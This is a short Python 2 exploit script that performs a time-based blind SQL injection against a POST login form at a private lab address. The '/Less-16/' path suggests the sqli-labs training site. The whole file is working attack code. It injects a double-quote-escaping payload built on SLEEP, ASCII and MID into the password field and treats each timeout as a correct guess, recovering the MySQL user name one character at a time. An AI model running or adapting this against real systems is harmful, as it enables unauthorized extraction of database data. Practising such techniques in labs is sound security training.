#!/usr/bin/env python
#encoding=utf-8

'''
POST -Blind-Boolian/Time Based - Double Quotes
'''

import urllib, httplib, time, string, sys, random

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# payloads
payloads = list(string.ascii_letters) + list(string.digits) + ['@', '_', '.']

# target
host = '10.0.103.130'

print 'Start to retrive MySQL User:'

user = ''

for i in range (1, 30):
    for payload in payloads:
        try:
            s = 'aaa"XOR(if(ascii(mid(user(),%s,1))=%s,sleep(4),0))OR"bbb' % (i, ord(payload))
            param = "uname=admin&passwd=%s" % urllib.quote(s)
            conn = httplib.HTTPConnection(host, timeout=3)
            conn.request(method='POST',
                            url = "/Less-16/",
                            body = param,
                            headers = headers
            )
            html_doc = conn.getresponse().read()
            conn.close()
        except Exception, e:
            #print e
            user += payload
            sys.stdout.write('\r[In Progress] '+ user)
            print
            sys.stdout.flush()
            break

print '\n[Done] MySQL user is ' + user
